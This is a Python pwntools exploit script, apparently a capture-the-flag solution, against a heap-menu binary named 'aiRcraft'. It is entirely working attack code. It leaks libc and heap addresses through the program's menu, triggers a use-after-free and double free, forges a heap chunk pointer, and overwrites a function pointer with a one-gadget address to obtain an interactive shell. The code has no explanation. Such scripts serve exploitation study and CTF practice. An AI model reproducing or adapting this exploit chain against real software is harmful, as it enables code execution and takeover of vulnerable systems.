from pwn import *
import sys

context(arch='amd64', os='linux')

DEBUG = False
if len(sys.argv) == 2:
	DEBUG = True

def fn_buy(idx, name):
	p.sendline("1")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	# len(max_name) == 0x20
	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

def fn_build(n, name):
	p.sendline("2")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n))
	recv = p.recv()
	if DEBUG: print recv

	if len(name) == n:
		p.send(name)
	else:
		p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

def fn_enter_airport(idx, n_menu, ret=False):
	p.sendline("3")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	# 1 : list all
	# 2 : sell the airport
	p.sendline(str(n_menu))
	data = p.recv().split("\x0a")
	if DEBUG: print data

	if n_menu == 1:
		p.sendline("3")

	if ret: return data

def fn_select_plane(name, n_menu, n_airport=0):
	p.sendline("4")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n_menu))

	if n_menu == 1:
		recv = p.recv()
		if DEBUG: print recv
		
		p.sendline(str(n_airport))
		recv = p.recv()
		if DEBUG: print recv

		p.sendline("3")
		recv = p.recv()
		if DEBUG: print recv

def fn_leak(list_leak):
	for t in list_leak:
		print "*** {} : {} ***".format(hex(t["addr"]), t["title"])
		print hexdump(p.leak(t["addr"], t["size"]))

def fn_leak_one(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(p.leak(addr, size))


target = "./aiRcraft"
code_base = 0x555555554000
heap_base = 0x555555757000
arrAirport = 0x202080
pHeadPlane = 0x202020
list_leak = [
	{
		"title": "heap_base",
		"addr" : heap_base,
		"size" : 0x280
	},{
		"title": "arrAirport",
		"addr" : code_base + arrAirport,
		"size" : 0x40
	},{
		"title": "pHeadPlane",
		"addr" : code_base + pHeadPlane,
		"size" : 0x40
	}
]
p = process(target)
recv = p.recv()
print recv

fn_build(0x80, "A"*8)
fn_build(0x80, "B"*8)
fn_build(0x80, "C"*8)

fn_enter_airport(0, 2)
fn_enter_airport(1, 2)

fn_buy(14, "a")
fn_select_plane("a", 1, 2)

libc_base = fn_enter_airport(2, 1, True)
libc_base = u64(libc_base[1].split("by ")[1].ljust(8, "\x00")) - 0x3c4bf8
one_shot = libc_base + 0x4526a
log.info("libc base : {}".format(hex(libc_base)))
log.info("one-shot  : {}".format(hex(one_shot)))

fn_buy(15, "b")
fn_select_plane("b", 1, 2)
addr_heap = fn_enter_airport(2, 1, True)
addr_heap = u64(addr_heap[4].split("by ")[1].ljust(8, "\x00"))
addr_heap = (addr_heap & 0xfffffffffffff000)
log.info("heap addr : {}".format(hex(addr_heap)))

fn_select_plane("a", 2) # UAF
fn_select_plane("b", 2) # UAF
fn_enter_airport(2, 2)  # double-freed

target_offset = 0x170
fn_buy(0, p64(addr_heap + target_offset - 0x38 + 0xe))
fn_buy(0, "E" * 8)
payload = "\x50" * 0x20
fn_buy(0, payload)

'''
0x559be21d4140:	0x5050505050505050	0x0050505050505050
0x559be21d4150:	0x4747000000000000	0x0000000000000000
0x559be21d4160:	0x0000559be21d4010	0x0000000000000000
0x559be21d4170:	0x0000559be18e5b7d	0x0000000000000041
0x559be21d4180:	0x00007f85e67b8b78	0x0000559be21d4240
'''
payload = "G" * 2
payload += p64(0)
payload += p64(addr_heap + 0x10)
payload += p64(0)
payload += p64(one_shot)
fn_build(0x40, payload)

fn_select_plane("\x50"*0x1f, 2)

p.interactive()



